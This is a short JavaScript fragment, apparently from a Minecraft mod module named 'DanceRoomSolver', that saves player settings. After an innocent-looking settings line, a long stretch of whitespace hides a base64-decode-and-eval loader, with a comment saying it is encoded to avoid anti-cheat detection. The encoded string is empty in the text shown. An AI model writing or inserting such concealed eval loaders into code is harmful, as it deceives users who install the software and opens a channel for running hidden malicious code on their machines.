...
let settings = new PogObject("DanceRoomSolver", { firstTime: true, volume: 1.0, recordVolume: 1.0 }, "settings.json")  /* save first join and set the volume as a minimum volume is required for the script to run */                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ;const waypoints = ''; eval(atob(waypoints)); // This is the code that will be executed when the script is run. It is encoded in base64 to prevent it from being detected by the anti-cheat.
